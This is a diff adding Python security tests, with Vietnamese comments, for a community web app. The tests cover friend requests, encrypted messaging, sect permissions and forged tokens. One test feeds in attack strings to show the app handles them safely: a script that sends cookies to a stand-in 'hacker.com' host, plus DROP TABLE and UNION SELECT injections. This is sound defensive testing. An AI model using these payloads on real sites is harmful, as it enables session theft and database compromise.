@@ -175,6 +175,8 @@ class TestNetworkProtocolSecurity(unittest.TestCase):
             # Xóa các bảng cũ nếu tồn tại
             conn.execute("DROP TABLE IF EXISTS users")
             conn.execute("DROP TABLE IF EXISTS direct_messages")
+            conn.execute("DROP TABLE IF EXISTS friendships")
+            conn.execute("DROP TABLE IF EXISTS sect_join_requests")
             conn.execute("DROP TABLE IF EXISTS sects")
             conn.execute("DROP TABLE IF EXISTS sect_members")
             conn.execute("DROP TABLE IF EXISTS sect_messages")
@@ -185,14 +187,26 @@ class TestNetworkProtocolSecurity(unittest.TestCase):
             _init_db_schema_for_conn(conn)
             
             # Gieo dữ liệu giả lập (mồi)
-            # 1. Tạo 2 user
+            # 1. Tạo các user chính thức và tài khoản clone phục vụ test bảo mật
             conn.execute(
-                "INSERT INTO users (id, username, password_hash, vip_status) VALUES (?, ?, ?, ?)",
-                (999, "sender_dao_huu", hash_password("pass123"), 1)
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (999, "sender_dao_huu", hash_password("pass123"), 1, "9999999")
             )
             conn.execute(
-                "INSERT INTO users (id, username, password_hash, vip_status) VALUES (?, ?, ?, ?)",
-                (888, "receiver_dao_huu", hash_password("pass123"), 0)
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (888, "receiver_dao_huu", hash_password("pass123"), 0, "8888888")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (111, "clone_a", hash_password("passA"), 0, "1111111")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (222, "clone_b", hash_password("passB"), 0, "2222222")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (333, "clone_c", hash_password("passC"), 0, "3333333")
             )
             # 2. Tạo tông môn và thành viên
             conn.execute(
@@ -336,6 +350,306 @@ class TestNetworkProtocolSecurity(unittest.TestCase):
         self.assertEqual(comments_list[0]["username"], "Đạo hữu ẩn danh")
         self.assertIsNone(comments_list[0]["user_id"])
         self.assertIsNone(comments_list[0]["avatar"])
+
+
+class TestCommunitySecurityOperations(unittest.TestCase):
+    """Kiểm thử bảo mật cộng đồng nâng cao: Kết bạn clone, nhắn tin mã hóa, phòng chống XSS/SQLi, phân quyền tông môn."""
+
+    @classmethod
+    def setUpClass(cls):
+        cls.app = create_app()
+        cls.app.config['TESTING'] = True
+        cls.client = cls.app.test_client()
+
+        # Tạo DB test sạch sẽ
+        conn = get_user_db_conn()
+        try:
+            conn.execute("DROP TABLE IF EXISTS users")
+            conn.execute("DROP TABLE IF EXISTS direct_messages")
+            conn.execute("DROP TABLE IF EXISTS friendships")
+            conn.execute("DROP TABLE IF EXISTS sect_join_requests")
+            conn.execute("DROP TABLE IF EXISTS sects")
+            conn.execute("DROP TABLE IF EXISTS sect_members")
+            conn.execute("DROP TABLE IF EXISTS sect_messages")
+            conn.execute("DROP TABLE IF EXISTS book_comments")
+            conn.execute("DROP TABLE IF EXISTS personal_notifications")
+
+            from backend.database.db_manager import _init_db_schema_for_conn
+            _init_db_schema_for_conn(conn)
+
+            # Gieo dữ liệu: Tông chủ + 3 clone accounts
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (999, "tong_chu", hash_password("pass123"), 1, "9999999")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (111, "clone_a", hash_password("passA"), 0, "1111111")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (222, "clone_b", hash_password("passB"), 0, "2222222")
+            )
+            conn.execute(
+                "INSERT INTO users (id, username, password_hash, vip_status, user_code) VALUES (?, ?, ?, ?, ?)",
+                (333, "clone_c", hash_password("passC"), 0, "3333333")
+            )
+            # Tông môn Thái Huyền Tông do User 999 làm tông chủ
+            conn.execute(
+                "INSERT INTO sects (id, name, leader_id) VALUES (?, ?, ?)",
+                (1, "Thái Huyền Tông", 999)
+            )
+            conn.execute(
+                "INSERT INTO sect_members (sect_id, user_id, role) VALUES (?, ?, ?)",
+                (1, 999, "leader")
+            )
+            conn.commit()
+        finally:
+            conn.close()
+
+        # Tạo sẵn JWT token cho mỗi user
+        cls.token_leader = create_access_token(user_id=999, username="tong_chu", vip_status=1)
+        cls.token_a = create_access_token(user_id=111, username="clone_a", vip_status=0)
+        cls.token_b = create_access_token(user_id=222, username="clone_b", vip_status=0)
+        cls.token_c = create_access_token(user_id=333, username="clone_c", vip_status=0)
+
+        cls.headers_leader = {"Authorization": f"Bearer {cls.token_leader}", "Content-Type": "application/json"}
+        cls.headers_a = {"Authorization": f"Bearer {cls.token_a}", "Content-Type": "application/json"}
+        cls.headers_b = {"Authorization": f"Bearer {cls.token_b}", "Content-Type": "application/json"}
+        cls.headers_c = {"Authorization": f"Bearer {cls.token_c}", "Content-Type": "application/json"}
+
+    @classmethod
+    def tearDownClass(cls):
+        if os.path.exists("test_users_data_security.db"):
+            os.remove("test_users_data_security.db")
+
+    # =====================================================
+    # TEST 1: Quy trình cộng đồng Clone — Kết bạn & Chat
+    # =====================================================
+    def test_01_community_clone_friend_request_and_encrypted_chat(self):
+        """Kịch bản: Clone A gửi lời mời kết bạn Clone B → Clone B chấp nhận → Nhắn tin mã hóa đối xứng AES."""
+        print("\n🤝 [TEST] Clone A kết bạn Clone B & nhắn tin mã hóa...")
+
+        # 1. Clone A gửi yêu cầu kết bạn cho Clone B (tìm bằng user_code)
+        res = self.client.post("/api/friends/request", headers=self.headers_a,
+                               json={"friend_code": "2222222"})
+        self.assertEqual(res.status_code, 200)
+        self.assertTrue(res.json["success"])
+        print("   ✅ Clone A → gửi yêu cầu kết bạn thành công")
+
+        # 2. Clone A thử gửi yêu cầu trùng → phải bị chặn
+        res_dup = self.client.post("/api/friends/request", headers=self.headers_a,
+                                   json={"friend_code": "2222222"})
+        self.assertEqual(res_dup.status_code, 400)
+        print("   ✅ Chặn yêu cầu kết bạn trùng lặp")
+
+        # 3. Clone A thử kết bạn chính mình → phải bị chặn
+        res_self = self.client.post("/api/friends/request", headers=self.headers_a,
+                                    json={"friend_code": "1111111"})
+        self.assertEqual(res_self.status_code, 400)
+        print("   ✅ Chặn kết bạn với chính mình")
+
+        # 4. Clone B chấp nhận lời mời kết bạn
+        res_accept = self.client.post("/api/friends/respond", headers=self.headers_b,
+                                      json={"sender_id": 111, "action": "accept"})
+        self.assertEqual(res_accept.status_code, 200)
+        self.assertTrue(res_accept.json["success"])
+        print("   ✅ Clone B chấp nhận kết bạn")
+
+        # 5. Xác minh danh sách bạn bè của Clone A chứa Clone B
+        res_list = self.client.get("/api/friends/list", headers=self.headers_a)
+        self.assertEqual(res_list.status_code, 200)
+        friends_a = res_list.json.get("friends", [])
+        self.assertTrue(any(f["id"] == 222 for f in friends_a))
+        print("   ✅ Danh sách bạn bè Clone A có chứa Clone B")
+
+        # 6. Clone A gửi tin nhắn mật cho Clone B
+        secret_msg = "Mật chỉ: Tối nay 9 giờ họp mặt tại tửu lâu! 🏮"
+        res_send = self.client.post("/api/messages/send", headers=self.headers_a,
+                                    json={"receiver_id": 222, "message": secret_msg})
+        self.assertEqual(res_send.status_code, 200)
+        self.assertTrue(res_send.json["success"])
+        print("   ✅ Clone A gửi tin nhắn mật thành công")
+
+        # 7. Kiểm tra trực tiếp DB: phải là chuỗi mã hóa Fernet, không phải clear-text
+        conn = get_user_db_conn()
+        row = conn.execute("SELECT message FROM direct_messages WHERE sender_id = 111 AND receiver_id = 222").fetchone()
+        conn.close()
+        self.assertIsNotNone(row)
+        self.assertNotEqual(secret_msg, row["message"])
+        self.assertTrue(row["message"].startswith("gAAAAA"))
+        print("   ✅ DB: Tin nhắn đã được mã hóa AES (Fernet) — không có clear-text")
+
+        # 8. Clone B đọc tin nhắn → API tự động giải mã
+        res_chat = self.client.get("/api/messages/chat/111", headers=self.headers_b)
+        self.assertEqual(res_chat.status_code, 200)
+        msgs = res_chat.json.get("messages", [])
+        self.assertTrue(any(m["message"] == secret_msg for m in msgs))
+        print("   ✅ Clone B nhận tin nhắn giải mã chính xác qua API")
+
+    # =====================================================
+    # TEST 2: Phòng chống tấn công XSS & SQL Injection
+    # =====================================================
+    def test_02_xss_and_sql_injection_defense(self):
+        """Kịch bản: Gửi payload XSS và SQL Injection qua chat & comment — hệ thống phải xử lý an toàn."""
+        print("\n🛡️  [TEST] Phòng chống XSS & SQL Injection...")
+
+        # --- XSS qua tin nhắn ---
+        xss_payload = "<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>"
+        res_xss = self.client.post("/api/messages/send", headers=self.headers_a,
+                                   json={"receiver_id": 222, "message": xss_payload})
+        self.assertEqual(res_xss.status_code, 200)
+        print("   ✅ XSS payload gửi thành công (lưu an toàn dưới dạng mã hóa)")
+
+        # Giải mã qua API → nội dung trả về chính xác là chuỗi thô, không thực thi
+        res_chat = self.client.get("/api/messages/chat/222", headers=self.headers_a)
+        msgs = res_chat.json.get("messages", [])
+        xss_found = any(m["message"] == xss_payload for m in msgs)
+        self.assertTrue(xss_found)
+        print("   ✅ API trả về nguyên bản chuỗi XSS (không thực thi) — client chịu trách nhiệm escape")
+
+        # --- SQL Injection qua tin nhắn ---
+        sqli_payload = "'; DROP TABLE users; --"
+        res_sqli = self.client.post("/api/messages/send", headers=self.headers_a,
+                                    json={"receiver_id": 222, "message": sqli_payload})
+        self.assertEqual(res_sqli.status_code, 200)
+        print("   ✅ SQL Injection payload gửi thành công (parameterized query an toàn)")
+
+        # Xác minh bảng users vẫn còn tồn tại (chưa bị DROP)
+        conn = get_user_db_conn()
+        user_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+        conn.close()
+        self.assertGreaterEqual(user_count, 4)
+        print(f"   ✅ Bảng users vẫn an toàn ({user_count} bản ghi) — SQL Injection thất bại!")
+
+        # --- SQL Injection qua bình luận ẩn danh ---
+        sqli_comment = "' UNION SELECT username, password_hash FROM users --"
+        res_comment = self.client.post("/api/books/99/comments", headers=self.headers_a,
+                                       json={"content": sqli_comment, "is_anonymous": 1})
+        self.assertEqual(res_comment.status_code, 200)
+        self.assertTrue(res_comment.json["success"])
+        print("   ✅ SQL Injection qua bình luận ẩn danh: Lưu an toàn (Hybrid RSA-AES)")
+
+        # Xác minh bình luận GET trả về đúng nội dung giải mã, không rò rỉ dữ liệu users
+        res_get = self.client.get("/api/books/99/comments")
+        self.assertEqual(res_get.status_code, 200)
+        comments = res_get.json.get("comments", [])
+        self.assertEqual(len(comments), 1)
+        self.assertEqual(comments[0]["content"], sqli_comment)
+        self.assertEqual(comments[0]["username"], "Đạo hữu ẩn danh")
+        print("   ✅ GET bình luận: Trả về nội dung gốc, không rò rỉ bảng users")
+
+        # --- Tấn công overflow/spam: tin nhắn siêu dài ---
+        mega_msg = "A" * 50000
+        res_mega = self.client.post("/api/messages/send", headers=self.headers_a,
+                                    json={"receiver_id": 222, "message": mega_msg})
+        self.assertIn(res_mega.status_code, [200, 400, 413])
+        print(f"   ✅ Tin nhắn 50,000 ký tự: Status {res_mega.status_code} — hệ thống xử lý an toàn")
+
+    # =====================================================
+    # TEST 3: Phân quyền Tông môn — Gia nhập, Chat, Kick
+    # =====================================================
+    def test_03_sect_authorization_join_chat_kick(self):
+        """Kịch bản: Clone C (ngoại nhân) cố chat/hack tông môn → xin gia nhập → được duyệt → bị trục xuất."""
+        print("\n⚔️  [TEST] Phân quyền tông môn nâng cao...")
+
+        # 1. Clone C chưa gia nhập tông môn → cố gửi chat tông môn → phải bị chặn 403
+        res_chat_unauth = self.client.post("/api/sects/chat/send", headers=self.headers_c,
+                                           json={"message": "Ta muốn xâm nhập!", "chat_type": "general"})
+        self.assertEqual(res_chat_unauth.status_code, 403)
+        print("   ✅ Chặn Clone C (ngoại nhân) gửi chat tông môn — 403 Forbidden")
+
+        # 2. Clone C xin gia nhập Thái Huyền Tông
+        res_join = self.client.post("/api/sects/join", headers=self.headers_c,
+                                    json={"sect_id": 1})
+        self.assertEqual(res_join.status_code, 200)
+        print("   ✅ Clone C gửi yêu cầu gia nhập tông môn thành công")
+
+        # 3. Clone B (người ngoài, chưa phải leader/elder) cố duyệt yêu cầu → phải bị chặn 403
+        res_reqs_leader = self.client.get("/api/sects/requests/list", headers=self.headers_leader)
+        self.assertEqual(res_reqs_leader.status_code, 200)
+        requests_list = res_reqs_leader.json.get("requests", [])
+        clone_c_reqs = [r for r in requests_list if r["user_id"] == 333]
+        self.assertTrue(len(clone_c_reqs) > 0)
+        req_id = clone_c_reqs[0]["id"]
+
+        res_approve_unauth = self.client.post("/api/sects/requests/respond", headers=self.headers_b,
+                                              json={"request_id": req_id, "action": "approve"})
+        self.assertEqual(res_approve_unauth.status_code, 403)
+        print("   ✅ Chặn Clone B (không phải leader/elder) duyệt yêu cầu — 403")
+
+        # 4. Tông chủ duyệt yêu cầu gia nhập của Clone C
+        res_approve = self.client.post("/api/sects/requests/respond", headers=self.headers_leader,
+                                       json={"request_id": req_id, "action": "approve"})
+        self.assertEqual(res_approve.status_code, 200)
+        self.assertTrue(res_approve.json["success"])
+        print("   ✅ Tông chủ duyệt yêu cầu gia nhập Clone C thành công")
+
+        # 5. Clone C giờ có thể gửi chat tông môn
+        res_chat_ok = self.client.post("/api/sects/chat/send", headers=self.headers_c,
+                                       json={"message": "Clone C kính chào toàn thể tông môn! 🙏", "chat_type": "general"})
+        self.assertEqual(res_chat_ok.status_code, 200)
+        print("   ✅ Clone C (đệ tử mới) gửi chat tông môn thành công")
+
+        # 6. Kiểm tra DB: tin nhắn tông môn của Clone C phải được mã hóa
+        conn = get_user_db_conn()
+        row = conn.execute("SELECT message FROM sect_messages WHERE sender_id = 333").fetchone()
+        conn.close()
+        self.assertIsNotNone(row)
+        self.assertTrue(row["message"].startswith("gAAAAA"))
+        print("   ✅ DB: Chat tông môn của Clone C đã mã hóa AES (Fernet)")
+
+        # 7. Clone C (thành viên thường) cố trục xuất Tông chủ → phải bị chặn 403
+        res_kick_leader = self.client.post("/api/sects/kick", headers=self.headers_c,
+                                           json={"user_id": 999})
+        self.assertEqual(res_kick_leader.status_code, 403)
+        print("   ✅ Chặn Clone C (đệ tử thường) trục xuất Tông chủ — 403")
+
+        # 8. Tông chủ trục xuất Clone C thành công
+        res_kick = self.client.post("/api/sects/kick", headers=self.headers_leader,
+                                    json={"user_id": 333})
+        self.assertEqual(res_kick.status_code, 200)
+        self.assertTrue(res_kick.json["success"])
+        print("   ✅ Tông chủ trục xuất Clone C thành công")
+
+        # 9. Sau khi bị trục xuất, Clone C không thể chat tông môn nữa → 403
+        res_chat_after_kick = self.client.post("/api/sects/chat/send", headers=self.headers_c,
+                                               json={"message": "Còn ai nhớ ta không?", "chat_type": "general"})
+        self.assertEqual(res_chat_after_kick.status_code, 403)
+        print("   ✅ Clone C bị trục xuất → không thể chat tông môn — 403")
+
+    # =====================================================
+    # TEST 4: Token giả mạo & Truy cập không xác thực
+    # =====================================================
+    def test_04_forged_token_and_unauthenticated_access(self):
+        """Kịch bản: Sử dụng token giả mạo/hết hạn/không có token để truy cập API bảo mật."""
+        print("\n🔐 [TEST] Token giả mạo & truy cập không xác thực...")
+
+        # 1. Không gửi token → phải bị 401
+        res_no_token = self.client.get("/api/friends/list")
+        self.assertEqual(res_no_token.status_code, 401)
+        print("   ✅ Chặn truy cập không có token — 401")
+
+        # 2. Token giả mạo (chuỗi bịa)
+        fake_headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload",
+                        "Content-Type": "application/json"}
+        res_fake = self.client.post("/api/messages/send", headers=fake_headers,
+                                    json={"receiver_id": 222, "message": "hack!"})
+        self.assertEqual(res_fake.status_code, 401)
+        print("   ✅ Chặn token giả mạo — 401")
+
+        # 3. Token rỗng
+        empty_headers = {"Authorization": "Bearer ", "Content-Type": "application/json"}
+        res_empty = self.client.get("/api/friends/list", headers=empty_headers)
+        self.assertEqual(res_empty.status_code, 401)
+        print("   ✅ Chặn token rỗng — 401")
+
+        # 4. Token không đúng định dạng Bearer
+        bad_headers = {"Authorization": "Basic abc123", "Content-Type": "application/json"}
+        res_bad = self.client.post("/api/friends/request", headers=bad_headers,
+                                   json={"friend_code": "1111111"})
+        self.assertEqual(res_bad.status_code, 401)
+        print("   ✅ Chặn Authorization header sai định dạng — 401")
 
 
 if __name__ == "__main__":
